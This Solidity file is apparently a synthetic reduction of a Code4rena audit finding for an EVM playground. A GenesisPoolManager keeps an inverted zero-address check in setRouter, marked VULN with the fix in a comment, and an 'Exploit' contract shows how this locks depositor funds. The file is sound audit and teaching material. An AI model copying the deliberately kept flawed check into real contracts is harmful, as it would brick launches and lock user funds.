// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Blackhole (Audit 507) — [H-01] Router address validation logic error
    prevents valid router assignment (Code4rena 2025-05-blackhole, #58333)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: setRouter requires `_router == address(0)` (inverted null check),
    so the owner can only CLEAR the router, never assign a functional one.
    A zero router bricks GenesisPool.launch and locks depositors' liquidity.
    Vulnerable require line preserved VERBATIM below (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal router stand-in (DEX addLiquidity surface).
contract MockRouter {
    bool public wasCalled;

    function addLiquidity(
        address,
        address,
        bool,
        uint256,
        uint256,
        uint256,
        uint256,
        address,
        uint256
    ) external returns (uint256, uint256, uint256) {
        wasCalled = true;
        return (1, 1, 1);
    }
}

/// @dev Minimal GenesisPool: launch fails hard if router is address(0), locking funds.
contract MockGenesisPool {
    uint256 public lockedNative;
    bool public launched;
    address public lastRouter;

    function fund() external payable {
        lockedNative += msg.value;
    }

    function launch(address _router, uint256 /*maturityTime*/) external {
        // Simulate real launch failure against IRouter(address(0)).
        if (_router == address(0)) {
            revert("Router is address(0)");
        }
        lastRouter = _router;
        launched = true;
        // Liquidity would be added via the router; release the lock as success.
        lockedNative = 0;
        MockRouter(_router).addLiquidity(address(0), address(0), false, 0, 0, 0, 0, address(0), 0);
    }
}

/// @notice Reduction of GenesisPoolManager with the inverted setRouter check.
///         Source: GenesisPoolManager.sol#L314 (code-423n4/2025-05-blackhole @ 92fff84).
contract GenesisPoolManager {
    address public owner;
    address public router;
    uint256 public constant MATURITY_TIME = 1 weeks;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(address _initialRouter) {
        owner = msg.sender;
        router = _initialRouter;
    }

    /// @notice Intended: set a non-zero router. Actual: only address(0) is accepted.
    function setRouter(address _router) external onlyOwner {
        require(_router == address(0), "ZA"); // @> VULN: inverted zero-address check — only address(0) accepted; valid routers always revert "ZA"
        // FIX: require(_router != address(0), "ZA");
        router = _router;
    }

    /// @notice Conceptual _launchPool: passes stored `router` into the pool launch.
    function launchPool(MockGenesisPool pool) external onlyOwner {
        pool.launch(router, MATURITY_TIME);
    }
}

/// @notice End-to-end exploit orchestrator (no cheatcodes).
/// CREATE order: initialRouter (1), newValidRouter (2), pool (3), manager (4).
contract Exploit {
    MockRouter public initialRouter;
    MockRouter public newValidRouter;
    MockGenesisPool public pool;
    GenesisPoolManager public manager;

    bool public setValidFailed;
    bool public launchBricked;
    uint256 public lockedAfterBrick;

    constructor() {
        initialRouter = new MockRouter(); // nonce 1
        newValidRouter = new MockRouter(); // nonce 2
        pool = new MockGenesisPool(); // nonce 3
        manager = new GenesisPoolManager(address(initialRouter)); // nonce 4 — Exploit is owner
    }

    function run() external payable {
        // Fund the genesis pool with native liquidity that should become LP on launch.
        require(msg.value >= 1 ether, "need 1 ETH");
        pool.fund{value: 1 ether}();
        require(pool.lockedNative() == 1 ether, "fund");

        // 1) Owner CANNOT set a functional new router — inverted require reverts "ZA".
        setValidFailed = false;
        try manager.setRouter(address(newValidRouter)) {
            setValidFailed = false;
        } catch {
            setValidFailed = true;
        }
        require(setValidFailed, "valid router should have been rejected");
        require(manager.router() == address(initialRouter), "router must be unchanged");

        // 2) Owner CAN set router to address(0) (the only value the require accepts).
        manager.setRouter(address(0));
        require(manager.router() == address(0), "router not cleared");

        // 3) Launch with zero router reverts → depositor liquidity stays locked forever.
        launchBricked = false;
        try manager.launchPool(pool) {
            launchBricked = false;
        } catch {
            launchBricked = true;
        }
        require(launchBricked, "launch should fail with zero router");
        require(!pool.launched(), "pool must not launch");
        lockedAfterBrick = pool.lockedNative();
        require(lockedAfterBrick == 1 ether, "liquidity must remain locked");

        // Harm: valid setRouter is impossible; clearing router bricks launches and locks funds.
        require(setValidFailed && launchBricked && lockedAfterBrick == 1 ether, "harm not demonstrated");
    }

    receive() external payable {}
}
